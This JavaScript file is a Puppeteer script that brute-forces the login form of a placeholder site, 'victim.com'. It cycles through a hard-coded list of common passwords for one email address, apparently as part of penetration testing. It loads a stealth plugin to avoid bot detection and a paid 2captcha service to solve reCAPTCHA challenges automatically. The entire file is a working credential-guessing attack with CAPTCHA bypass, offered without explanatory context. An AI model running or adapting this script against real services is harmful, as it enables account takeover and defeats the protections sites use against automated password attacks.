

const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha')
const puppeteer = require('puppeteer-extra');
const pluginStealth = require("puppeteer-extra-plugin-stealth"); 
 

puppeteer.use(
  RecaptchaPlugin({
    provider: {
      id: '2captcha',
      token: 'YOUR_KEY_HERE',
    },
    visualFeedback: true, 
    throwOnError: true,
    solveScoreBased: true,
    solveInactiveChallenges: true
  })
);

(async () => {
  // Launch a headless browser
   try {
	  const browser = await puppeteer.launch({ headless: false , args: ['--proxy-server=http://127.0.0.1:8081'], timeout:70000 });

	  const passwords = [
		  '1234567890',
		  '1q2w3e4r5t',
		  'qwertyuiop',
		  '123456789a',
		  'FQRG7CS493',
		  '0123456789',
		  '1111111111',
		  '0987654321',
		  'basketball',
		  'password12',
		  'q1w2e3r4t5y6',
		  'a123456789',
		  'VQsaBLPzLa',
		  'cjmasterinf',
		  '1234567891',
		  'PE#5GZ29PTZMSE',
		  'DIOSESFIEL',
		  '3rJs1la7qE',
		]; 	

   page = await browser.newPage();
	  
   for (const password of passwords) {

	  await page.goto('https://www.victim.com/login', { timeout: 70000 });

	  	
	  await page.waitForSelector('input#email');
	  
	  await page.waitForSelector('input#email');
	  await page.waitForSelector('input#password');
	  await page.waitForSelector('input#signin');

	  await page.type('input#email', 'testing@fortbridge.co.uk', { delay: 100 });
	  await page.type('input#password',  password, { delay: 100 });
	  await page.click('input#signin', { delay: 100 });

	  await page.waitForSelector('input#signin');
          page.click('input#signin',{ delay: 500 })
          await page.solveRecaptchas()
          console.log('solved captchas')
	 
	 await Promise.all([
    		page.waitForNavigation(),
	 ])

	 page.waitForTimeout(10); 

         }
     }
    catch (error) {
    	console.error('An error occurred:', error);
    }
})();

